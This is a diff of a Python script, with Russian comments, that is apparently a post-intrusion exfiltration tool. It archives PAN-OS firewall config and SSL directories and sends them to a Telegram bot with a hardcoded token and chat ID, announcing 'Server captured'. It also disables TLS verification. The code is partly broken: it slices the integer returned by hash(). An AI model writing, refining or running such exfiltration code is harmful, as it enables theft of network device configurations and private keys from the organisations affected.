@@ -1,23 +1,21 @@
 import requests
 import os
+import tarfile
+import io
 
-def upload_file_to_filebin(file_path):
+def archive_directory(directory_path):
     """
-    Загружает файл на файловый обменник (например, File.io)
+    Упаковывает директорию в архив формата tar.gz.
     """
-    url = 'https://file.io'
-    files = {'file': open(file_path, 'rb')}
-    response = requests.post(url, files=files)
-    if response.status_code == 200:
-        data = response.json()
-        return data.get('link')  # Возвращаем ссылку на загруженный файл
-    else:
-        print("Ошибка загрузки файла")
-        return None
+    tar_stream = io.BytesIO()
+    with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
+        tar.add(directory_path, arcname=os.path.basename(directory_path))
+    tar_stream.seek(0)
+    return tar_stream
 
 def send_telegram_message(message, file_paths):
     """
-    Отправляет сообщение в Telegram с файлами (ссылками)
+    Отправляет сообщение с файлами в Telegram.
     """
     tg_bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'
     tg_chat_id = '-1002403648422'
@@ -34,10 +32,9 @@ def send_telegram_message(message, file_paths):
     }
     
     # Отправка сообщения
-    response = requests.post(url, data=payload)
+    response = requests.post(url, data=payload, verify=False)
     
-    # Если нужно отправить сам файл, используем следующий код:
-    file_urls = []
+    # Отправка файлов
     for file_path in file_paths:
         with open(file_path, 'rb') as file:
             files = {
@@ -45,25 +42,29 @@ def send_telegram_message(message, file_paths):
                 'document': (os.path.basename(file_path), file)
             }
             send_file_url = f'https://api.telegram.org/bot{tg_bot_token}/sendDocument'
-            send_response = requests.post(send_file_url, files=files)
+            send_response = requests.post(send_file_url, files=files, verify=False)
             if send_response.status_code == 200:
                 print(f"Файл {file_path} отправлен.")
-                file_urls.append(file_path)  # Добавим файл, если успешно отправлен
+            else:
+                print(f"Ошибка при отправке файла {file_path}. Статус код: {send_response.status_code}")
     
-    return response.ok, file_urls
+    return response.ok
 
 def main():
     try:
-        # Загрузка файлов
-        files = ["/opt/pancfg/mgmt/saved-configs", "/opt/pancfg/mgmt/ssl"]
+        # Пути к директориям
+        directories_to_archive = ["/opt/pancfg/mgmt/saved-configs", "/opt/pancfg/mgmt/ssl"]
         
-        file_links = []
-        for file in files:
-            link = upload_file_to_filebin(file)
-            if link:
-                file_links.append(link)
-        
-        if file_links:
+        # Упаковка директорий в архивы
+        archived_files = []
+        for directory in directories_to_archive:
+            archive_stream = archive_directory(directory)
+            archive_path = f"{os.path.basename(directory)}.tar.gz"
+            with open(archive_path, 'wb') as f:
+                f.write(archive_stream.read())
+            archived_files.append(archive_path)
+
+        if archived_files:
             # Формируем сообщение
             message = "🟢 Server captured\n"
             message += f"------------------\n"
@@ -72,19 +73,18 @@ def main():
             message += f"City: Some City\n"  # Тут вставьте город
             message += f"------------------\n"
             message += f"#{hash('192.168.1.1')[:8]}"
-            
+
             # Отправка сообщений и файлов
-            success, sent_files = send_telegram_message(message, file_links)
+            success = send_telegram_message(message, archived_files)
             if success:
                 print("Message sent successfully!")
             else:
                 print("Error sending message.")
             
             # Если файлы успешно загружены на сервер, отправляем их
-            if sent_files:
-                print("Successfully uploaded files to file.io:", sent_files)
+            print("Successfully uploaded files:", archived_files)
         else:
-            print("No files uploaded.")
+            print("No files to upload.")
     
     except Exception as e:
         print(f"Error: {e}")
